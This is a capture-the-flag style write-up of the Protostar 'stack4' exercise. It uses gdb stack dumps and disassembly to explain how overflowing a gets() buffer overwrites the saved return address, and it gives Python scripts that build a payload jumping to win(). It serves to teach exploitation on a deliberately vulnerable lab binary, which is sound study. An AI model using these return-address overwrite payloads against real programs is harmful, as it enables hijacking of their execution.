Running the program, and input any random values:
```sh
$ ./stack4 
adsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffffadsfffffffffffffffffff
Segmentation fault
```
it gaves us a segfault, meaning we are trying to accessing some address that is not supposed to be accessed, or we are accessing junk address.

```as
(gdb) disas win
Dump of assembler code for function win:
0x080483f4 <win+0>:	push   ebp
0x080483f5 <win+1>:	mov    ebp,esp
0x080483f7 <win+3>:	sub    esp,0x18
0x080483fa <win+6>:	mov    DWORD PTR [esp],0x80484e0
0x08048401 <win+13>:	call   0x804832c <puts@plt>
0x08048406 <win+18>:	leave  
0x08048407 <win+19>:	ret    
End of assembler dump.

(gdb) disas main
Dump of assembler code for function main:
0x08048408 <main+0>:	push   ebp
0x08048409 <main+1>:	mov    ebp,esp
0x0804840b <main+3>:	and    esp,0xfffffff0
0x0804840e <main+6>:	sub    esp,0x50
0x08048411 <main+9>:	lea    eax,[esp+0x10]
0x08048415 <main+13>:	mov    DWORD PTR [esp],eax
0x08048418 <main+16>:	call   0x804830c <gets@plt>
0x0804841d <main+21>:	leave  
0x0804841e <main+22>:	ret    
End of assembler dump.
```

Based on the disassembler it self, the code contains only `gets()` function and a buffer that is 64 bytes. Unlike the previous `stack3` challenge, we were given some function pointer (FP), and we leverage it to redirect the FP to that `win()` by overflowing the buffer until it hits the FP. However, in this case, how come we can end up into the `win()` function?

We can leverage the `ret` instruction. `ret` instruction is equivalent with `pop eip  ; or "jmp [esp]"` (src?), basically it will return to its caller, the function that initiates and call `main()`. The address is located at the top `esp`. For example in this case:

```as
(gdb) ni
esp            0xbffff7bc	0xbffff7bc
ebp            0xbffff800	0xbffff800
eip            0x804841e	0x804841e <main+22>
0xbffff7bc:	0xb7eadc76	0x00000001	0xbffff864	0xbffff86c
0xbffff7cc:	0xb7fe1848	0xbffff820	0xffffffff	0xb7ffeff4
0xbffff7dc:	0x0804824b	0x00000001	0xbffff820	0xb7ff0626
0xbffff7ec:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
0xbffff7fc:	0x00000000	0xbffff838	0x113dd257	0x3b6a2447
0xbffff80c:	0x00000000	0x00000000	0x00000000	0x00000001
0x804841e <main+22>:	ret    
0x804841f:	nop
0x8048420 <__libc_csu_fini>:	push   ebp
```
it would be `0xbffff7bc`. And if we examine the detail of it:
```as
(gdb) x/x 0xbffff7bc
0xbffff7bc: 0xb7eadc76
(gdb) x/x $esp
0xbffff7bc: 0xb7eadc76
(gdb) x/i 0xb7eadc76
0xb7eadc76 <__libc_start_main+230>: mov    DWORD PTR [esp],eax
```
you see, it points back to the function that initiates and call the `main()` function, which is `__libc_start_main`. Pretty much until here the idea is simple, we will overflow the buffer until it hits the address that responsible for return back, but how do we know where is the address? Like being said before, the address will be top of `esp` after the instruction `leave`, how come though? 

Before the instruction `__libc_start_main+230`, we were calling something which is `<__libc_start_main+227>:	call   DWORD PTR [ebp+0x8]`. We will just assuming it calls our `main()` without any further inspection (todo: make this statement true). Since `call` something will automatically store the next address onto stack, in this case `0xb7eadc76`, we know where to return, we will return to that instruction, after calling the `__libc_start_main+227`.

We will calculate the buffer needed in order to overflow the buffer until it reach the before old `ebp`. Old `ebp` is refering to the first instruction `push ebp`, which push the value `ebp` onto stack. 

```as
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /opt/protostar/bin/stack4 
esp            0xbffff7bc	0xbffff7bc
ebp            0xbffff838	0xbffff838
eip            0x8048408	0x8048408 <main>
0xbffff7bc:	0xb7eadc76	0x00000001	0xbffff864	0xbffff86c
0xbffff7cc:	0xb7fe1848	0xbffff820	0xffffffff	0xb7ffeff4
0xbffff7dc:	0x0804824b	0x00000001	0xbffff820	0xb7ff0626
0xbffff7ec:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
0xbffff7fc:	0x00000000	0xbffff838	0xea111c0a	0xc046ea1a
0xbffff80c:	0x00000000	0x00000000	0x00000000	0x00000001
0xbffff81c:	0x08048340	0x00000000	0xb7ff6210	0xb7eadb9b
0x8048408 <main>:	push   ebp
0x8048409 <main+1>:	mov    ebp,esp

(gdb) ni
esp            0xbffff7b8	0xbffff7b8
ebp            0xbffff838	0xbffff838
eip            0x8048409	0x8048409 <main+1>
0xbffff7b8:	0xbffff838	0xb7eadc76	0x00000001	0xbffff864
0xbffff7c8:	0xbffff86c	0xb7fe1848	0xbffff820	0xffffffff
0xbffff7d8:	0xb7ffeff4	0x0804824b	0x00000001	0xbffff820
0xbffff7e8:	0xb7ff0626	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4
0xbffff7f8:	0x00000000	0x00000000	0xbffff838	0xea111c0a
0xbffff808:	0xc046ea1a	0x00000000	0x00000000	0x00000000
0xbffff818:	0x00000001	0x08048340	0x00000000	0xb7ff6210
0x8048409 <main+1>:	mov    ebp,esp
0x804840b <main+3>:	and    esp,0xfffffff0
```

you see after `push ebp` that `ebp` `0xbffff838`  is pushed onto stack which we know its preciding contains the address of next `call` of instruction `__libc_start_main+227`
```as
0xb7eadc73 <__libc_start_main+227>:	call   DWORD PTR [ebp+0x8]
0xb7eadc76 <__libc_start_main+230>:	mov    DWORD PTR [esp],eax
```
so that what I mean by saying old previous `ebp`, we need to overflow the buffer until it reached that address.

We know we are accessing the buffer started at the address `esp+0x10`, see `main+9` `lea` instruction. Here is the value after calling the `gets()`, in other word instruction `<main+21>: leave`:

```as
(gdb) x/wx $esp+0x10
0xbffff770:	0x41414141
```
the `ebp` is at address `0xbffff7b8`, so we just need to add 8 more bytes to reach `0xbffff7bc: 0xb7eadc76`. 
```as
(gdb) p 0xbffff7b8+0x8-0xbffff770
$5 = 80
```
in total we need 80 bytes, and don't forget at the end 4 bytes the address of `win()` will be placed in there. We will use this simple python script for generating the payload:
```py
import string
import struct

payload = ""

for i, c in enumerate(string.ascii_uppercase):
    if (int(i) + 1) * 4 == 76:
        break
    payload += c * 4

win_address = struct.pack("I",0x080483f4)
payload += win_address
print(payload)
```
continuing:
```as
(gdb) ni
esp            0xbffff7bc	0xbffff7bc
ebp            0x41414141	0x41414141
eip            0x804841e	0x804841e <main+22>
0xbffff7bc:	0x080483f4	0x00000000	0xbffff864	0xbffff86c
0xbffff7cc:	0xb7fe1848	0xbffff820	0xffffffff	0xb7ffeff4
0xbffff7dc:	0x0804824b	0x00000001	0xbffff820	0xb7ff0626
0xbffff7ec:	0xb7fffab0	0xb7fe1b28	0xb7fd7ff4	0x00000000
0xbffff7fc:	0x00000000	0xbffff838	0x4eb51d00	0x64e2eb10
0xbffff80c:	0x00000000	0x00000000	0x00000000	0x00000001
0xbffff81c:	0x08048340	0x00000000	0xb7ff6210	0xb7eadb9b
0x804841e <main+22>:	ret    
0x804841f:	nop
0x8048420 <__libc_csu_fini>:	push   ebp
0x0804841e in main (argc=Cannot access memory at address 0x41414149
) at stack4/stack4.c:16
16	in stack4/stack4.c
```
wait there is an error, when dealing with instruction `leave`. `leave` instruction is the same as:
```as
mov esp, ebp
pop ebp
```
it's the reverse of the stack frame initialization at the beginning of a function call:
```as
push ebp
mov ebp,esp
```
in this particular input, we can't `pop` the `ebp` because our we overflow it with `0x41414141`. Well it's not going to change the fact that we already overflow the top stack with `0x080483f4` which will be used by `ret` instruction.
```bash
$ ./stack4 < /tmp/payl 
code flow successfully changed
Segmentation fault
```

## Mitigating segfault

Now, this is extra, the reason there is a segfault because after we craft the `win()` address at the buffer where `ret` will be redirected to it, the address we need to put some credible address after it so that when we jump into `win()` it knows where to return, in above case we didn't gave anything `0x00000000`.

```as
(gdb) 
esp            0xbffff7a4	0xbffff7a4
ebp            0xbffff7bc	0xbffff7bc
eip            0x80483fa	0x80483fa <win+6>
0xbffff7a4:	0x41414141	0x41414141	0x41414141	0x41414141
0xbffff7b4:	0x41414141	0xbffff838	0xbffff838	0x00000000
0xbffff7c4:	0xbffff864	0xbffff86c	0xb7fe1848	0xbffff820
0xbffff7d4:	0xffffffff	0xb7ffeff4	0x0804824b	0x00000001
0xbffff7e4:	0xbffff820	0xb7ff0626	0xb7fffab0	0xb7fe1b28
0xbffff7f4:	0xb7fd7ff4	0x00000000	0x00000000	0xbffff838
0xbffff804:	0x1b3189c9	0x31667fd9	0x00000000	0x00000000
0x80483fa <win+6>:	mov    DWORD PTR [esp],0x80484e0
0x8048401 <win+13>:	call   0x804832c <puts@plt>
0x8048406 <win+18>:	leave  

(gdb) ni
esp            0xbffff7c0	0xbffff7c0
ebp            0xbffff838	0xbffff838
eip            0x8048407	0x8048407 <win+19>
0xbffff7c0:	0x00000000	0xbffff864	0xbffff86c	0xb7fe1848
0xbffff7d0:	0xbffff820	0xffffffff	0xb7ffeff4	0x0804824b
0xbffff7e0:	0x00000001	0xbffff820	0xb7ff0626	0xb7fffab0
0xbffff7f0:	0xb7fe1b28	0xb7fd7ff4	0x00000000	0x00000000
0xbffff800:	0xbffff838	0x1b3189c9	0x31667fd9	0x00000000
0xbffff810:	0x00000000	0x00000000	0x00000001	0x08048340
0xbffff820:	0x00000000	0xb7ff6210	0xb7eadb9b	0xb7ffeff4
0x8048407 <win+19>:	ret    
0x8048408 <main>:	push   ebp
0x8048409 <main+1>:	mov    ebp,esp
```
as you can see on instruction `win+19: ret` the top stack is `0x00000000`, let's try to replace it with address `0xb7eadc76` which is just `__libc_start_main+230`. Here is the updated script:
```py
import string
import struct

payload = ""

for i, c in enumerate(string.ascii_uppercase):
    if (int(i) + 1) * 4 == 76:
        break
    payload += c * 4

win_address = struct.pack("I",0x080483f4)
caller = struct.pack("I",0xb7eadc76)
prev_ebp = struct.pack("I",0xbffff838)
payload += prev_ebp + win_address + caller
print(payload)
```
also note that there is new variable `prev_ebp` it's just the `ebp` in `__libc_start_main`, it's not necessary though.

Submitting the payload with newly crafted address:
```bash
$ python /tmp/payl.py > /tmp/payl
$ ./stack4 < /tmp/payl 
code flow successfully changed
```

To briefly summarize in this last piece of code, we are not modifying the "old ebp", redirect the execution of `ret` instruction to `win()`, and redirect `ret` instruction back to `__libc_start_main+230`


Input with 64 bytes
```as
(gdb) c
Continuing.
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOO
eax            0xbffff770	-1073744016
ecx            0xbffff770	-1073744016
edx            0xb7fd9334	-1208118476
ebx            0xb7fd7ff4	-1208123404
esp            0xbffff760	0xbffff760
ebp            0xbffff7b8	0xbffff7b8
esi            0x0	0
edi            0x0	0
eip            0x804841d	0x804841d <main+21>
eflags         0x200246	[ PF ZF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
0xbffff760:	0xbffff770	0xb7ec6165	0xbffff778	0xb7eada75
0xbffff770:	0x41414141	0x42424242	0x43434343	0x44444444
0xbffff780:	0x45454545	0x46464646	0x47474747	0x48484848
0xbffff790:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0xbffff7a0:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0xb7fd7f00
0xbffff7b0:	0x08048430	0x00000000	0xbffff838	0xb7eadc76
0xbffff7c0:	0x00000001	0xbffff864	0xbffff86c	0xb7fe1848
0x804841d <main+21>:	leave  
0x804841e <main+22>:	ret    
0x804841f:	nop

Breakpoint 2, main (argc=1, argv=0xbffff864) at stack4/stack4.c:16
16	in stack4/stack4.c
```

## See Also

"Buffer Overflows can Redirect Program Execution - bin 0x0D". https://www.youtube.com/watch?v=8QzOC8HfOqU&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=14.

"do you know how "return" works under the hood? (are you SURE?)".https://www.youtube.com/watch?v=e46wHUjNDjE.